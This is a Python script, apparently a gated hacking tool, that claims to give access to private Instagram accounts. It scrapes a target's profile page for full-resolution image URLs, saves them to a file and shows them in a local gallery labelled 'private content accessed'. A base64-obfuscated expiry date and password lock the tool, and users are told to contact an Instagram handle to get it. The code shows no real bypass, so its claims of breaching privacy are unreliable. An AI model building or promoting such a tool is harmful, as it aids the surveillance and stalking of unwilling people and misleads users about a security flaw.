import os
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import time
import urllib.parse
import socket
import threading
import webbrowser
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys
import subprocess
import base64

# ========== DATE VERIFICATION - HIDDEN ==========
_d1 = 'MjAyNi0wMy0xMw=='  # 
_d2 = 'MjAyNi0wMy0xNQ=='  # 
_p = 'dWdoYWNrZXJ6aw=='    # 

current_date = time.strftime("%Y-%m-%d")
if not (base64.b64decode(_d1).decode('utf-8') <= current_date <= base64.b64decode(_d2).decode('utf-8')):
    print("\033[1;31m" + "="*60)
    print("⚠️ TOOL EXPIRED ⚠️".center(60))
    print("="*60)
    print("\033[1;33mWant Tool? Contact Instagram:\033[0m".center(60))
    print("\033[1;36m" + "@" + "ugvikesh".center(58) + "\033[0m")
    print("\033[1;31m" + "="*60 + "\033[0m")
    exit()

print("\033[1;33mEnter password: \033[0m", end="")
password = input().strip()
if password != base64.b64decode(_p).decode('utf-8'):
    print("\033[1;31m" + "="*60)
    print("❌ INVALID PASSWORD ❌".center(60))
    print("="*60)
    print("\033[1;33mWant Tool? Contact Instagram:\033[0m".center(60))
    print("\033[1;36m" + "@" + "ugvikesh".center(58) + "\033[0m")
    print("\033[1;31m" + "="*60 + "\033[0m")
    exit()
# ================================================

# ========== HEADERS ==========
def get_headers():
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-GB,en;q=0.9',
        'dpr': '1',
        'priority': 'u=0, i',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"6.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '1000',
    }
# =============================

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;31m")
    print(r"""
   _________   ___  ___  _____   _____ __________   ____  _________  ________
  /  _/ ___/  / _ \/ _ \/  _/ | / / _ /_  __/ __/  / __ \/ __/  _/ |/ /_  __/
 _/ // (_ /  / ___/ , _// / | |/ / __ |/ / / _/   / /_/ /\ \_/ //    / / /   
/___/\___/  /_/  /_/|_/___/ |___/_/ |_/_/ /___/   \____/___/___/_/|_/ /_/    
                                                                             
    """)
    print("\033[1;33m")
    print("Tool By UG VIKESH")
    print("\033[0m")

def loading_animation():
    print("\033[1;95m")
    for i in range(1, 101):
        print(f"\r[•] Loading... {i}%", end="", flush=True)
        time.sleep(0.03)
    print("\r[✓] Loading Complete! 100%", flush=True)
    print("\033[0m")

def fetch_instagram_profile(username):
    headers = get_headers()
    url = f'https://www.instagram.com/{username}/'
    print(f"\033[1;36m[*] Fetching profile: {username}\033[0m")
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code != 200:
            return None
        return response
    except:
        return None

def extract_timeline_data(html_content):
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        script_tags = soup.find_all('script', {'type': 'application/json'})

        for script in script_tags:
            script_content = script.string
            if not script_content:
                continue
            if 'polaris_timeline_connection' in script_content and 'image_versions2' in script_content:
                try:
                    data = json.loads(script_content)
                    return data
                except:
                    continue
    except:
        pass
    return None

def decode_url(escaped_url):
    try:
        decoded = escaped_url.encode('utf-8').decode('unicode_escape')
        decoded = unquote(decoded)
        return decoded
    except:
        return escaped_url

def extract_highest_resolution_urls(obj, urls=None, post_id=None):
    if urls is None:
        urls = {}

    try:
        if isinstance(obj, dict):
            if 'pk' in obj and isinstance(obj.get('pk'), str):
                post_id = obj['pk']

            if 'image_versions2' in obj:
                candidates = obj['image_versions2'].get('candidates', [])
                if candidates:
                    highest_res = max(candidates, key=lambda x: x.get('width', 0) * x.get('height', 0))
                    url = highest_res.get('url', '')
                    
                    if url:
                        decoded_url = decode_url(url)
                        if post_id and post_id not in urls:
                            urls[post_id] = decoded_url

            for value in obj.values():
                extract_highest_resolution_urls(value, urls, post_id)

        elif isinstance(obj, list):
            for item in obj:
                extract_highest_resolution_urls(item, urls, post_id)
    except:
        pass

    return urls

def generate_gallery_html(post_urls, username):
    total_images = len(post_urls)
    
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Private Gallery - @{username}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }}
        .header {{
            text-align: center;
            padding: 30px 20px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.9) 0%, rgba(118, 75, 162, 0.9) 100%);
            border-radius: 15px;
            margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.2);
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        .tool-by {{
            font-size: 1.2em;
            color: #ff6b6b;
            margin-top: 5px;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255,107,107,0.5);
        }}
        .stats {{
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        .gallery {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 30px;
            padding: 20px;
        }}
        .post-card {{
            background: rgba(26, 26, 26, 0.95);
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
            transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        .post-card:hover {{
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
            border-color: #667eea;
        }}
        .post-header {{
            padding: 15px;
            background: rgba(34, 34, 34, 0.95);
            border-bottom: 1px solid rgba(102, 126, 234, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .post-id {{
            font-size: 0.85em;
            color: #667eea;
            font-family: monospace;
            background: rgba(42, 42, 42, 0.9);
            padding: 5px 10px;
            border-radius: 5px;
            word-break: break-all;
        }}
        .image-container {{
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 450px;
            position: relative;
        }}
        .post-image {{
            max-width: 100%;
            max-height: 600px;
            object-fit: contain;
            display: block;
            transition: opacity 0.3s ease;
            cursor: pointer;
        }}
        .post-image:hover {{
            opacity: 0.9;
        }}
        .post-footer {{
            padding: 15px;
            background: rgba(34, 34, 34, 0.95);
            border-top: 1px solid rgba(102, 126, 234, 0.3);
        }}
        .download-btn {{
            display: inline-block;
            padding: 10px 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-size: 0.95em;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .download-btn:hover {{
            opacity: 0.9;
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }}
        .timestamp {{
            color: #888;
            font-size: 0.8em;
            margin-top: 10px;
        }}
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: rgba(255,255,255,0.7);
            border-top: 1px solid rgba(255,255,255,0.1);
        }}
        .status-badge {{
            display: inline-block;
            padding: 8px 16px;
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            border-radius: 20px;
            color: #ff6b6b;
            font-weight: bold;
            margin-top: 15px;
        }}
        @media (max-width: 768px) {{
            .gallery {{
                grid-template-columns: 1fr;
            }}
            .header h1 {{
                font-size: 1.8em;
            }}
            .container {{
                padding: 15px;
            }}
        }}
        .lightbox {{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }}
        .lightbox.active {{
            display: flex;
        }}
        .lightbox img {{
            max-width: 95%;
            max-height: 95%;
            object-fit: contain;
        }}
        .server-status {{
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 10px 20px;
            border-radius: 30px;
            font-family: monospace;
            border: 1px solid #00ff00;
            z-index: 1001;
            backdrop-filter: blur(5px);
        }}
        .success-message {{
            background: rgba(0,255,0,0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="server-status">
        🟢 Localhost Server Active | http://localhost:8080
    </div>
    
    <div class="container">
        <div class="header">
            <h1>📸 Instagram Private Gallery</h1>
            <p style="font-size: 1.3em; margin-top: 15px;">@{username}</p>
            <div class="tool-by">Tool By UG VIKESH</div>
            <div class="status-badge">
                ⚠️ VULNERABILITY CONFIRMED - PRIVATE CONTENT ACCESSED
            </div>
            <div class="success-message">
                ✅ SUCCESSFULLY EXTRACTED {total_images} PRIVATE POSTS
            </div>
            <div class="stats" id="stats">
                <!-- Stats will be filled by JavaScript -->
            </div>
        </div>
        
        <div class="gallery" id="gallery">
            <!-- Gallery will be populated here -->
        </div>
        
        <div class="footer">
            <p>Tool By UG VIKESH | Instagram Private Post Monitor POC</p>
            <p style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.5);">
                🔒 Running on localhost:8080 | Full Resolution Images Only | No Duplicates
            </p>
        </div>
    </div>

    <div class="lightbox" id="lightbox">
        <img src="" alt="Full Size Image">
    </div>

    <script>
        const postImages = {json.dumps(post_urls, indent=2)};
        const username = "{username}";
        const totalImages = {total_images};
        
        function renderGallery() {{
            const gallery = document.getElementById('gallery');
            const stats = document.getElementById('stats');
            
            stats.innerHTML = `
                <p style="font-size: 1.8em; font-weight: bold;">📊 Statistics</p>
                <p style="margin-top: 15px; font-size: 1.2em;">Total Private Posts Accessed: <span style="color: #667eea; font-weight: bold;">${{totalImages}}</span></p>
                <p style="font-size: 1.1em;">All Images: Full Screen / Highest Resolution</p>
                <p style="margin-top: 20px; font-size: 0.95em; color: #88ff88;">✅ Successfully extracted private content</p>
            `;
            
            Object.entries(postImages).forEach(([postId, imageUrl]) => {{
                const postCard = document.createElement('div');
                postCard.className = 'post-card';
                
                postCard.innerHTML = `
                    <div class="post-header">
                        <span class="post-id">📌 Post ID: ${{postId.substring(0, 15)}}...</span>
                    </div>
                    <div class="image-container">
                        <img src="${{imageUrl}}" class="post-image" alt="Instagram Post" loading="lazy" 
                             onclick="openLightbox('${{imageUrl}}')">
                    </div>
                    <div class="post-footer">
                        <a href="${{imageUrl}}" class="download-btn" download="${{postId}}.jpg" target="_blank">📥 Download Full Resolution</a>
                    </div>
                `;
                
                gallery.appendChild(postCard);
            }});
        }}
        
        function openLightbox(imageUrl) {{
            const lightbox = document.getElementById('lightbox');
            const lightboxImg = lightbox.querySelector('img');
            lightboxImg.src = imageUrl;
            lightbox.classList.add('active');
        }}
        
        document.getElementById('lightbox').addEventListener('click', function() {{
            this.classList.remove('active');
        }});
        
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'Escape') {{
                document.getElementById('lightbox').classList.remove('active');
            }}
        }});
        
        renderGallery();
    </script>
</body>
</html>
    """
    
    return html_content


def generate_unsuccessful_html(username):
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Private Gallery - @{username}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            max-width: 600px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            border-radius: 20px;
            padding: 50px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 20px;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        .tool-by {{
            font-size: 1.2em;
            color: #ff6b6b;
            margin-top: 5px;
            margin-bottom: 30px;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255,107,107,0.5);
        }}
        .unsuccessful-message {{
            background: rgba(255,107,107,0.2);
            border: 2px solid #ff6b6b;
            color: #ff6b6b;
            padding: 30px;
            border-radius: 15px;
            font-size: 1.5em;
            font-weight: bold;
            margin-top: 20px;
        }}
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: rgba(255,255,255,0.7);
            border-top: 1px solid rgba(255,255,255,0.1);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 Instagram Private Gallery</h1>
            <p style="font-size: 1.3em; margin-top: 15px;">@{username}</p>
            <div class="tool-by">Tool By UG VIKESH</div>
            <div class="unsuccessful-message">
                ❌ UNSUCCESSFUL<br>
                <span style="font-size: 0.7em; margin-top: 15px; display: block;">No private posts found or account is public</span>
            </div>
        </div>
        
        <div class="footer">
            <p>Tool By UG VIKESH | Instagram Private Post Monitor POC</p>
            <p style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.5);">
                🔒 No private content available for @{username}
            </p>
        </div>
    </div>
</body>
</html>
    """
    return html_content


def start_local_server_and_open_chrome(html_content, port=8080, successful=True):
    html_filename = 'instagram_gallery_temp.html'
    with open(html_filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    class GalleryHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = '/' + html_filename
            return super().do_GET()
    
    def run_server():
        server = HTTPServer(('localhost', port), GalleryHandler)
        print(f"\n\033[1;32m[✓] Server started at http://localhost:{port}\033[0m")
        if successful:
            print(f"\033[1;36m[→] Opening browser automatically...\033[0m")
        server.serve_forever()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    time.sleep(2)
    
    browser_url = f'http://localhost:{port}'
    
    print("\033[1;33m")
    print("[!] Attempting to open browser automatically...")
    print("\033[0m")
    
    browser_opened = False
    
    try:
        if os.name == 'posix':
            try:
                webbrowser.open(browser_url)
                browser_opened = True
                print("\033[1;32m[✓] Browser opened via webbrowser\033[0m")
            except:
                pass
        
        if not browser_opened:
            webbrowser.open(browser_url)
            browser_opened = True
            print("\033[1;32m[✓] Browser opened via webbrowser\033[0m")
            
    except Exception as e:
        print(f"\033[1;31m[-] Error opening browser: {e}\033[0m")
    
    if browser_opened:
        print("\n\033[1;32m" + "="*50)
        print("✅ BROWSER OPENED SUCCESSFULLY!")
        print(f"📱 Viewing: {browser_url}")
        print("="*50 + "\033[0m\n")
    else:
        print(f"\n\033[1;33m[!] Please open manually: {browser_url}\033[0m")
    
    return server_thread, html_filename


def save_urls_to_file(image_urls, username, successful=True):
    if successful:
        txt_filename = f'{username}_private_urls.txt'
        with open(txt_filename, 'w', encoding='utf-8') as f:
            f.write(f"Instagram Private Posts - @{username}\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Total Posts: {len(image_urls)}\n\n")

            for post_id, url in image_urls.items():
                f.write(f"POST ID: {post_id}\n")
                f.write(f"URL: {url}\n")
                f.write("-" * 80 + "\n\n")

        print(f"\033[1;32m[+] Saved {len(image_urls)} URLs to {txt_filename}\033[0m")
        
        html_content = generate_gallery_html(image_urls, username)
        html_filename = f'{username}_private_gallery.html'
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\033[1;32m[+] Generated gallery: {html_filename}\033[0m")
    else:
        html_content = generate_unsuccessful_html(username)
        html_filename = f'{username}_private_gallery.html'
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        print(f"\033[1;33m[!] No posts found for @{username}\033[0m")
    
    return html_content


def main():
    global username_global
    
    banner()

    print("=" * 80)
    print("\033[1;32mInstagram Private Account Access\033[0m")
    print("=" * 80)
    print()

    print("\033[1;32m")
    username = input("Enter Instagram username: ").strip()
    print("\033[0m")
    username_global = username

    if not username:
        print("\033[1;31m[-] Error: Username cannot be empty\033[0m")
        return

    loading_animation()

    response = fetch_instagram_profile(username)

    if not response:
        print("\n\033[1;31m❌ UNSUCCESSFUL\033[0m")
        html_content = generate_unsuccessful_html(username)
        save_urls_to_file({}, username, successful=False)
        start_local_server_and_open_chrome(html_content, successful=False)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Server stopped\033[0m")
        return

    timeline_data = extract_timeline_data(response.text)

    if not timeline_data:
        print("\n\033[1;31m❌ UNSUCCESSFUL\033[0m")
        html_content = generate_unsuccessful_html(username)
        save_urls_to_file({}, username, successful=False)
        start_local_server_and_open_chrome(html_content, successful=False)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Server stopped\033[0m")
        return

    print("\n\033[1;36m[*] Extracting image URLs...\033[0m")
    image_urls = extract_highest_resolution_urls(timeline_data)

    if not image_urls:
        print("\n\033[1;31m❌ UNSUCCESSFUL\033[0m")
        html_content = generate_unsuccessful_html(username)
        save_urls_to_file({}, username, successful=False)
        start_local_server_and_open_chrome(html_content, successful=False)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Server stopped\033[0m")
        return

    print()
    print("=" * 80)
    print(f"\033[1;32m✅ SUCCESSFUL - {len(image_urls)} posts found!\033[0m")
    print("=" * 80)
    print()

    html_content = save_urls_to_file(image_urls, username, successful=True)

    print()
    print("\033[1;36m[✓] Starting server...\033[0m")
    
    try:
        server_thread, temp_html = start_local_server_and_open_chrome(html_content, successful=True)
        
        print("\n" + "=" * 80)
        print("\033[1;32m🟢 SERVER: http://localhost:8080\033[0m")
        print("=" * 80)
        print("\n\033[1;33m[!] Press Ctrl+C to stop\033[0m\n")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n\033[1;32m[✓] Server stopped\033[0m")
        try:
            os.remove('instagram_gallery_temp.html')
        except:
            pass


if __name__ == "__main__":
    username_global = ""
    main()